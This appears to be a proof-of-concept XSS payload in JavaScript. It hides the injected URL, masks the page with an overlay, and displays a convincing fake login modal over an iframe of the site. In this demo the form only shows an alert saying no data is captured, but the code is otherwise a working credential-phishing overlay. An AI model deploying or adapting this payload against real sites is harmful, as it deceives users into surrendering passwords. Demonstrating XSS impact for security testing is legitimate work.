/* 0) Make URL pretty */
history.pushState(null, '', '/');

/* 1) Add an immediate white overlay that sits above EVERYTHING */
(() => {
  const inject = () => {
    if (document.getElementById('xssWhite')) return;
    const o = document.createElement('div');
    o.id = 'xssWhite';
    o.setAttribute('style',
      'position:fixed;inset:0;background:#fff;opacity:1;'+
      'z-index:2147483647;transition:opacity .2s linear;pointer-events:all;'
    );
    document.body.appendChild(o);
  };
  if (document.body) inject();
  else document.addEventListener('DOMContentLoaded', inject);
})();

/* 2) Failsafe: always run our demo init after 500ms */
setTimeout(() => {
  if (document.getElementById('xssRoot')) return; // avoid double-init

  const root = document.createElement('div');
  root.id = 'xssRoot';
  root.innerHTML = `
    <style>
      .xss-root{position:fixed;inset:0;z-index:2147483000;font-family:Arial,sans-serif}
      .xss-bg{position:absolute;inset:0;pointer-events:none}
      .xss-bg iframe{width:100%;height:100%;border:0;opacity:.9;transition:opacity .5s}
      .xss-dim{position:absolute;inset:0;background:#000;opacity:0;transition:opacity .5s;pointer-events:none}

      .xss-modal{
        position:absolute;left:50%;top:50%;
        transform:translate(-50%,-50%) scale(.96);
        opacity:0;transition:opacity .5s,transform .5s;
        width:420px;background:rgba(0,0,0,.85);color:#fff;padding:28px;border-radius:12px;
        box-shadow:0 10px 30px rgba(0,0,0,.5);font-size:18px;line-height:1.4
      }
      .xss-modal, .xss-modal *{box-sizing:border-box;font-family:Arial,sans-serif}

      .xss-modal h2{margin:0 0 16px;font-size:26px}
      .xss-field{margin:12px 0 0}
      .xss-label{display:block;margin:0 0 6px;font-size:16px;opacity:.95}
      .xss-input{
        display:block;width:100%;height:44px;padding:10px 12px;
        border-radius:6px;border:1px solid rgba(255,255,255,.32);
        background:rgba(255,255,255,.08);color:#fff;font-size:16px;outline:none
      }
      .xss-input:focus{border-color:rgba(255,255,255,.55);background:rgba(255,255,255,.12)}
      .xss-button{
        margin-top:18px;width:100%;height:46px;padding:0 14px;border:0;border-radius:8px;
        background:#fff;color:#000;font-weight:700;font-size:16px;cursor:pointer
      }

      /* Reveal after 1s over 0.5s */
      .xss-show .xss-bg iframe{opacity:.3}
      .xss-show .xss-dim{opacity:.4}
      .xss-show .xss-modal{opacity:1;transform:translate(-50%,-50%) scale(1)}
    </style>

    <div class="xss-root">
      <div class="xss-bg"><iframe src="/" title="root-bg"></iframe></div>
      <div class="xss-dim"></div>
      <form class="xss-modal" id="xssForm" autocomplete="off">
        <h2>Please log in</h2>
        <div class="xss-field">
          <label class="xss-label" for="xssUser">Username</label>
          <input class="xss-input" id="xssUser" name="user">
        </div>
        <div class="xss-field">
          <label class="xss-label" for="xssPass">Password</label>
          <input class="xss-input" id="xssPass" type="password" name="pass">
        </div>
        <button class="xss-button" type="submit">Login</button>
      </form>
    </div>
  `;
  document.body.appendChild(root);

  // Start the fade/dim + popup after 1s
  setTimeout(() => root.querySelector('.xss-root').classList.add('xss-show'), 1000);

  // Demo submit
  root.querySelector('#xssForm').addEventListener('submit', (e) => {
    e.preventDefault();
    alert('This is an XSS demo (no data has been captured by it)');
  });

  // Fade away the white overlay AFTER our UI is mounted
  const white = document.getElementById('xssWhite');
  if (white) {
    white.style.opacity = '0';
    setTimeout(() => white.remove(), 220);
  }
}, 500);
